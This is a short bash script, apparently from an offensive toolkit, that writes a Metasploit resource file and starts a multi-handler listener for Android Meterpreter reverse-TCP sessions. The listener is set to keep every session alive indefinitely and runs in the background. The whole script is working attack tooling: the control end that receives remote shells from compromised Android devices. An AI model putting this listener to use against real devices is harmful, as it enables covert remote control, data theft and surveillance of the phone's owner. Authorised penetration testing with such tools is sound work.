#!/bin/bash
# start_listener.sh — Launch Metasploit multi-handler
# Usage: ./start_listener.sh <LHOST> <LPORT>

LHOST="${1}"
LPORT="${2:-4444}"

if [ -z "$LHOST" ]; then
    echo "Usage: $0 <LHOST> [LPORT]"
    echo "Example: $0 192.168.1.100 4444"
    exit 1
fi

echo "[*] Generating Metasploit resource script..."

cat > /tmp/handler.rc << EOF
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST ${LHOST}
set LPORT ${LPORT}
set ExitOnSession false
set SessionExpirationTimeout 0
exploit -j -z
EOF

echo "[*] Resource file: /tmp/handler.rc"
echo "[*] Starting Metasploit handler on ${LHOST}:${LPORT}..."
echo "[*] Press Ctrl+C to stop."
echo ""

msfconsole -q -r /tmp/handler.rc
